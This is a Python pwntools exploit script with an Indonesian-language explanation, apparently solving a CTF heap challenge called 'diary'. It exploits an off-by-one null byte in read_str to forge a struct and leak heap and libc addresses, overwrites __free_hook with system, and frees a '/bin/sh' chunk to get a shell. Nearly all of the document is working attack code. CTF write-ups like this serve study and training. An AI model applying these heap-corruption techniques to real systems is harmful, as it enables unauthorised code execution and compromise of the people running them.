"""
Vuln terdapat pada read_str dimana str[c] = 0 akan selalu meletakkan nullbyte di akhir input yang ketika membaca tepat 160 karakter akan menyebabkan one byte overflow
Exploit ini dapat kita manfaatkan untuk mengoverwrite satu byte dari pointer next untuk melakukan arbitary read/write.

Pertama-tama, kita lakukan leak heap address. address heap ini akan kita gunakan untuk melakukan leak address libc yang ada di heap
Untuk melakukan leak libc kita harus melakukan free sebanyak 8 kali berturut-turut untuk memenuhi tchace bin yang memiliki kapasitas maksimal 7 chunck
saat melakukan free yang ke 8, chunk ini akan diletakkan di unsorted bin sehingga libc address akan ditulis di fd dan bk pointer.

Lalu kita overwrite satu byte terakhir dari pointer next yang akan mengarahkan ke address yang lebih tinggi
dengan demikian kita membuat struct diary palsu yang pointer nextnya dapat dikontrol dengan mengedit data diary yang sebelumnya
pointer next struct palsu ini kita arahkan ke heap chunk yang memiliki address libc.

Setelah libc dileak kita dapat memperhitungkan address system untuk memanggil shell. Karena RELRO full maka kita tidak bisa mengoverwrite GOT.
kita bisa mengoverwrite __free_hook dengan mengedit pointer next struct palsu ke address __free_hook dan dengan memanfaatkan fungsi edit_diary kita bisa mengoverwrite __free_hook dengan address system
Selanjutnya tinggal melakukan free ke heap chunk yang address awalnya berisi /bin/sh. Disini kita tidak bisa mengontrol ID dengan membuat diary baru
namun kita bisa mengedit ID serta tanggal struct palsu tadi. setelah itu kita bisa melakukan free struct tersebut.
"""

from pwn import *

# r = process('./diary')
# attach(r, '''
# b*read_diary+182
# c
# ''')

r = remote("0.0.0.0", 4000)
# attach(pidof('diary')[0], '''
# b*read_diary+182
# c
# ''')

l = ELF('./libc6_2.31-0ubuntu6_amd64.so', checksec=False)


def add_diary(d, m, y, data):
    r.sendlineafter('> ', '1')
    r.recvuntil(' : ')
    _id = r.recvline()[:-1]
    r.sendlineafter(' : ', str(d))
    r.sendlineafter(' : ', str(m))
    r.sendlineafter(' : ', str(y))
    r.sendafter(' :\n', data)
    return _id

def read_diary(itr):
    ret = []
    r.sendlineafter('> ', '2')
    for i in range(itr):
        r.sendlineafter('> ', '1')
    r.recvuntil(" : ")
    ret.append(r.recvline()[:-1])
    r.recvuntil(" : ")
    ret += r.recvline()[:-1].split("-")
    ret.append(r.recvuntil("[")[:-1])
    r.sendlineafter("> ", "2")
    return ret

def edit_diary(_id, data):
    r.sendlineafter('> ', '3')
    r.sendlineafter(' : ', str(_id))
    r.sendafter('Data :\n', data)

def delete_diary(_id):
    r.sendlineafter('> ', '4')
    r.sendlineafter(' : ', str(_id))

def unsign(x):
    if(x < 0):
        x += 2**32
    return x

# alokasi heap
for i in range(13):
    add_diary(1, 1, 1, chr(ord('A')+i)*160) # 0-9

# leak heap address
heap_leak = read_diary(0)[-1].replace('\n', '')
heap_leak = heap_leak[160:].ljust(8, '\0')
# print heap_leak.encode("hex")
heap_leak = u64(heap_leak)-192
print hex(heap_leak)

# unsorted bin attack untuk leak libc
for i in range(7, -1, -1):
    delete_diary(i)

# one byte overflow, mengarahkan pointer next ke tempat lain (address yang lebih kecil) di heap
# sehingga tercipta struct diary palsu di heap
edit_diary(10, 'A'*160)
edit_diary(10, 'X'*128 + p64(heap_leak)) # buat next pointer struct palsu dengan address heap yang dileak untuk melakukan leak libc address

# leak libc
ll = read_diary(4)
l1 = unsign(int(ll[0]))
l2 = int(ll[1])
libc_leak = (l2 << 32) | l1
print hex(libc_leak)

# hitung address awal libc
l.address = libc_leak - 2014176

# ubah next pointer struct palsu ke __free_hook-16 (dikurang 16 karena diseduaikan dengan variabel id, day, month, year)
edit_diary(10, 'X'*128 + p64(l.symbols['__free_hook']-16))

# overwrite __free_hook dengan address system menggunakan fungsi edit diary dengan id 0 (bisa dipastikan dengan fungsi read diary)
edit_diary(0, p64(l.symbols['system']))

# karena kita akan melakukan free dengan pointer yang berisi kalimat /bin/sh
# masalahnya address struct diawal selalu berisi ID dan hari, dimana kita tidak bisa mengontrol variabel ID
# namun, kita mempunyai satu chunk palsu yang dapat kita kontrol ID dan day dengan mengubah isi diary sebelumnya
# kita akan ubah variabel ID dan day dengan string /bin/sh
edit_diary(9, 'O'*144+'/bin/sh\x00')

# delete diary dengan id 0x6e69622f yang merupakan string dari /bin
delete_diary(0x6e69622f)

r.interactive()
r.close()